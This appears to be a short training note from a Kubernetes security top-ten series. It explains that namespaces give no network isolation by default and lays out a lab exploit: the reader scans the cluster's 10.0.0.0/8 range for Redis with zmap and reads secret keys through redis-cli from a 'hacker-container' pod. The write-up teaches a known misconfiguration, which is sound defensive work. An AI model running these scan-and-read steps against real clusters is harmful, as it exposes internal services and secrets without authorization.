# K07:  Missing Network Segmentation Controls

## Context: Kubernetes namespaces bypass

Most people assume that resources in Kubernetes namespaces are secure and not able to access each other. Wrong! 

By default, Kubernetes comes with flat networking schema and if we need to have segmentation then we have to create them by creating boundaries like Network Security Policies. This vournability could lead to critical resources being exposed internally. 

## Exploit

In this scenario, you will access resource in other namespaces.

```shell
# kubectl run -it hacker-container --image=madhuakula/hacker-container -- sh
kubectl exec -it hacker-container -- sh

rm /etc/zmap/zmap.conf
zmap -p 6379 10.0.0.0/8 -o results.csv
cat results.csv

redis-cli -h <IP>
IP:6379>keys *
IP:6379>GET SECRETSTUFF
```
# Links

- [Kubernetes namespaces bypass](https://madhuakula.com/kubernetes-goat/docs/scenarios/scenario-11/kubernetes-namespaces-bypass-from-kubernetes-cluster-pod/welcome)